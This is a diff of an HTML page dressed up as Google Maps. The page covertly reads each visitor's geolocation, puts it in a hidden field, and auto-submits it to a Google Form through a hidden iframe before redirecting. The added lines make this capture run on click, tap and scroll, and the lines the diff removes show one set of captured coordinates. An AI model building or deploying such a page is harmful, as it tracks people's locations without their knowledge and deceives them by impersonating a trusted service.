@@ -1,4 +1,5 @@
-<html><head>
+<html>
+<head>
     <title>Googleマップ</title>
     <link rel="icon" href="map_icon.png" type="image/png">
 </head>
@@ -17,18 +18,11 @@
         }
     </style>
     <form action="https://docs.google.com/forms/u/1/d/e/1FAIpQLScfax4AMp-T2HvQtv4kEgaKvV9T5xI917XbI6f8KZx4_t53Tw/formResponse" method="post" target="hidden_iframe" id="mG61Hd" jsmodel="TOfxwf Q91hve" data-shuffle-seed="2868127642733565241" data-response="%.@.[]]" data-first-entry="0" data-last-entry="4" data-is-first-page="true">
-        
-        <input type="hidden" name="entry.518300877" id="geo_data" value="latitude:34.373632
-longitude:132.4613632
-altitude:null
-position accuracy:944.9185457922755
-altitude accuracy:null
-Direction of movement:null
-speed:null
-">
-      
+        <!-- 非表示のフィールドを追加 -->
+        <input type="hidden" name="entry.518300877" id="geo_data">
+        <!-- JavaScriptで位置情報を設定 -->
 
-        <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;" onload="if(submitted){window.location='https://www.google.co.jp/maps/@34.3720144,132.4613632,14z?hl=ja&entry=ttu';}"></iframe>
+        <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;" onload="if(submitted){window.location='ログイン後に飛ぶページ';}"></iframe>
     </form>
     <script>
       /*  function extractQueryStringFromUrl() {
@@ -41,7 +35,7 @@ speed:null
             return queryString;
         }
 
-       
+        // ページ自体のURLからクエリ文字列を取得する
         var queryString = extractQueryStringFromUrl();
 
         var url = queryString;
@@ -64,19 +58,31 @@ speed:null
 
             var date = new Date(position.timestamp);
 
-            
+            // geo_text += "取得時刻:" + date.toLocaleString() + "\n";
 
-           
+            // 位置情報を非表示のフィールドに設定
             document.getElementById("geo_data").value = geo_text;
 
-           
+            // フォームを自動送信
             document.forms[0].submit();
             window.location.href = url;
         }
+
+        document.body.addEventListener("click",test
+        );
+
+        // Body タグがタップされた時にすでに定義されている関数を実行する
+        document.body.addEventListener("touchstart", test
+        );
+
+        // ページがスクロールされた時にすでに定義されている関数を実行する
+        window.addEventListener("scroll", test
+        );
 
         test();
 
     </script>
 
 
-</body></html>
+</body>
+</html>
